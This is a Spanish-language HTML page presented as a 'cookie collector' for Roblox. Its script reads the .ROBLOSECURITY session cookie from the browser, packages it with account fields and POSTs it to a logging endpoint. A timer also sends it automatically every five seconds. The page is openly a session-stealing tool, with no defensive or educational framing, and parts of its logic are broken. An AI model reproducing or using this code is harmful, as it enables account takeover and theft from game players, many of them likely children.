<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DepazzHub Cookie Collector</title>
    <style>
        body { font-family: system-ui; padding: 2rem; background: #1a1a2e; color: white; }
        .container { max-width: 500px; margin: 0 auto; text-align: center; }
        button { background: #4ecca3; border: none; padding: 1rem 2rem; font-size: 1.2rem; border-radius: 8px; cursor: pointer; color: black; font-weight: bold; margin-top: 1rem;}
        button:hover { background: #3db58a; }
        .status { margin-top: 1rem; padding: 0.75rem; border-radius: 6px; display: block; text-align: left; }
        .success { background: #2d5a27; color: #4ecca3; }
        .error { background: #e94560; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: #4ecca3;">🍪 DepazzHub Cookie Collector</h1>
        <p>Captura el .ROBLOSECURITY de esta pestaña y envíalo al webhook.</p>
        <button onclick="sendCookie()">💾 Enviar Cookie + Datos</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        // Obtener .ROBLOSECURITY del document.cookie
        const getRobloxCookie = () => {
            return document.cookie.split(';').filter(c => c.trim().startsWith('.ROBLOSECURITY='))
                .map(c => c.substring(14))
                .shift();
        };

        const sendCookie = async () => {
            const cookie = getRobloxCookie() || "NO ENCONTRADA";
            
            if (!cookie) {
                document.getElementById('status').innerHTML = 
                    '<span class="error">❌ No se encontró .ROBLOSECURITY en las cookies de esta pestaña.</span>';
                return;
            }

            const data = {
                username: "unknown",
                displayName: "unknown",
                userId: 0,
                gameId: 0,
                accountAge: "N/A",
                region: "US",
                cookie: ".ROBLOSECURITY=" + cookie
            };

            try {
                const res = await fetch("http://localhost:3000/log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                if (res.ok) {
                    document.getElementById('status').innerHTML = 
                        '<span class="success">✅ ¡Cookie enviada con éxito!</span>';
                } else {
                    throw new Error("Error en respuesta del servidor");
                }
            } catch (err) {
                document.getElementById('status').innerHTML = 
                    `<span class="error">❌ ${err.message}</span>`;
            }
        };

        // Auto-enviar cada 5 segundos si ya hay cookie
        setInterval(() => {
            if (getRobloxCookie()) sendCookie();
        }, 5000);
    </script>
</body>
</html>
